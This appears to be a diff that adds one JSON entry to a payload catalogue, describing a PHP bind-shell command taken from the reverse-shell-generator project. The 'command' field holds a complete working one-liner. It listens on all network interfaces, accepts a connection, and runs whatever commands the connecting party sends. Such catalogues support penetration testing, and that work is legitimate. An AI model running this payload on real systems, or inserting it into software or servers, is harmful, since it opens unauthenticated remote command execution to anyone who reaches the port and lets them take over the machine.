@@ -1,0 +1,31 @@
+{
+  "id": "rsg-bindshell-php-bind",
+  "name": "RSG · BindShell · PHP Bind",
+  "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",<lport>);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
+  "description": "Bind Shell payload — PHP Bind (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "bind-shell",
+    "bind",
+    "mac",
+    "linux",
+    "windows"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "BindShell/PHP Bind/79",
+  "category": "payloads",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
